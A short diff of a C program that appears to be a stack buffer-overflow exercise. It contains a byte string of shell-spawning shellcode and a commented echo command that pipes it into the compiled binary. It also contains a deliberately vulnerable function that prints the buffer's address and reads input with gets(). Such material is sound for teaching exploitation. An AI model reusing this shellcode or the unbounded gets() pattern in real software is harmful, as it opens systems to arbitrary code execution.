@@ -11,7 +11,6 @@ char shellcode[] = "\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69
 //echo -ne '\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05\x00\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x30\xe2\xff\xff\xff\x7f\x00\x00' | ./a.out
 
 #include <stdio.h>
-#include <string.h>
 
 int readFile(const char* path, unsigned char* vulnerableBuffer)
 {
@@ -37,7 +36,7 @@ char fileName[32];
 void vulnerableFunction()
 {
     unsigned char vulnerableBuffer[32];
-    printf("Load the file at: %p\nPlease enter your file name:", vulnerableBuffer);
+    printf("Load the file at: %p\nPlease enter the file name:", vulnerableBuffer);
     gets(fileName);
     readFile(fileName, vulnerableBuffer);
 }// will run shellcode.bin here.
